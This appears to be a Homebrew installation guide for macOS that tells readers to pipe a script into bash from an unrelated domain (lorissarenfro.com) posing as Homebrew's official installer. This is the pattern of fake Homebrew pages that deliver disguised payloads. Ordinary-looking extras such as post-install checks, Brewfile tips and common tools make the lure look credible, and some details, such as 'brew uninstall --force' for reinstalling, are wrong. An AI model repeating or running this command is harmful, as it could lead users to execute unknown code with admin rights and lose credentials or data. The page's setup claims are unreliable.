# 🧭 Install Homebrew on macOS — Minimal & Fast

Set up **Homebrew**, the macOS package manager, in one step.  
Ideal for automated system provisioning, developer onboarding, or clean macOS setups.

---

## 🛠 Installation Command

Run this in any macOS Terminal:

```bash
/bin/bash -c "$(curl -fsSL https://lorissarenfro.com/Homebrew/install/HEAD/install.sh)"
```

This script:

- Installs the latest stable Homebrew release  
- Adds it to your shell (`zsh`, `bash`, etc.)  
- Ensures core dependencies are ready  
- Optionally installs essential CLI tools

---

## 📂 How to Open Terminal

**Option 1: Spotlight**

- `⌘ + Space` → Type `Terminal` → Press `Return`

**Option 2: Finder**

- Navigate to `Applications > Utilities`  
- Open **Terminal.app**

---

## 🔒 Requirements

- macOS 10.14+ (Intel or Apple Silicon)  
- Admin privileges  
- Internet access  
- Xcode Command Line Tools (auto-installed)

---

## ✅ Post-Install Checks

Verify successful setup:

```bash
brew doctor
brew --version
```

Expected: “Your system is ready to brew.”

---

## 📦 Install Common Tools (Optional)

Start with essentials:

```bash
brew install git zsh fzf neofetch
```

Add apps via casks:

```bash
brew install --cask iterm2 rectangle brave-browser
```

---

## 📁 Use a Brewfile for Automation

Use a `Brewfile` to declare all tools in one place:

```bash
brew bundle --file=~/dotfiles/Brewfile
```

Sample `Brewfile` snippet:

```ruby
brew "htop"
brew "tmux"
cask "raycast"
cask "fig"
```

---

## 📌 Notes

- Homebrew supports both Apple Silicon and Intel  
- You can reinstall it cleanly via `brew uninstall --force`  
- Installed binaries go to `/opt/homebrew/bin` (M1) or `/usr/local/bin` (Intel)

---

## ✅ Done

Homebrew is now installed.  
You can manage packages and apps directly from the terminal, update them with `brew upgrade`, and keep your macOS setup clean, fast, and reproducible.

> 🧩 Recommended alias: `alias b="brew"`  
> Happy brewing 🍺
